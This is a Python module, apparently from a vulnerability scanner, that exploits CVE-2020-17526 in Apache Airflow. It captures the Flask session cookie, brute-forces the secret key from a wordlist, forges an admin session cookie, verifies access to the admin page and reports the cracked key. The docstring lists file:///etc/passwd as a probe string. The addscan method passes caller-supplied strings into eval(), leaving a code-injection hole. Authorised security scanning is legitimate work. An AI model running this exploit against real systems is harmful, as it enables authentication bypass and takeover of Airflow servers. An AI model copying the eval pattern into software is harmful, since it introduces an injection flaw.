#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    ApacheAirflow扫描类: 
        Airflow 身份验证绕过漏洞
            CVE-2020-17526
file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
from thirdparty import flask_unsign
import re

class Airflow():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ApacheAirflow'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2020_17526_payloads = [
            {
                'path': 'admin/airflow/login',
                'data': ''
            },
            {
                'path': 'airflow/login',
                'data': ''
            },
            {
                'path': 'login',
                'data': ''
            },
            {
                'path': '',
                'data': ''
            }
        ]

    def cve_2020_17526_scan(self, url):
        ''' Airflow 使用默认会话密钥, 这会导致在启用身份验证时冒充任意用户 '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'unAuthorized'
        vul_info['vul_id'] = 'CVE-2020-17526'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])             # * 合并Headers

        for payload in self.cve_2020_17526_payloads:    # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res1 = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res1.status_code, res1)          # * LOG

                if ((res1.status_code == 200) and ('Set-Cookie' in res1.headers)):      # * 判断响应包中是否有Set-Cookie
                    set_cookie = res1.headers['Set-Cookie']
                    cookie = re.search(r'.{76}\.{1}.{6}\.{1}.{27}', set_cookie)         # * 是否存在Flask Cookie
                    if cookie:
                        cookie = cookie.group()                                         # * 获取Flask Cookie
                        c = flask_unsign.Cracker(cookie, quiet=True)                    # * 使用获取的Cookie创建Cracker对象
                        file = open('lib/db/secretKey_fast.txt', encoding='utf-8')      # * secret密钥字典
                        secretKeys = file.readlines()
                        file.close()

                        for key in range(len(secretKeys)):                              # * 去除\n
                            secretKeys[key] = secretKeys[key].replace('\n', '')

                        secretKey = c.crack(secretKeys)                                 # * 开始暴破secret

                        if secretKey:                                                   # * 如果暴破成功, 会返回密钥, 否则为None
                            session = flask_unsign.sign(                                # * 利用secret伪造session
                                {'user_id': '1', '_fresh': False, '_permanent': True},
                                secretKey
                            )
                            cookie = {                                                  # * 设置session
                                'Cookie': 'session=' + session
                            }
                            headers.update(cookie)                                      # * 更新headers

                        verify_url = url + 'admin/'
                        verify_res = requests.get(
                            target, 
                            timeout=self.timeout, 
                            headers=headers, 
                            data=data, 
                            proxies=self.proxies, 
                            verify=False
                        )
                        logger.logging(vul_info, verify_res.status_code, verify_res)          # * LOG
                    else:
                        continue
                else:
                    continue
                # vul_info['target'] = url + 'admin/'
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if ((verify_res.status_code == 200) and (('Schedule' in verify_res.text) or ('Recent Tasks' in verify_res.text))):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Secret Key': secretKey,
                    'Payload': {
                        'Url': url,
                        'Path': path,
                        'Cookie': cookie['Cookie']
                    }
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2020_17526_scan, url=url)
        ]

airflow = Airflow()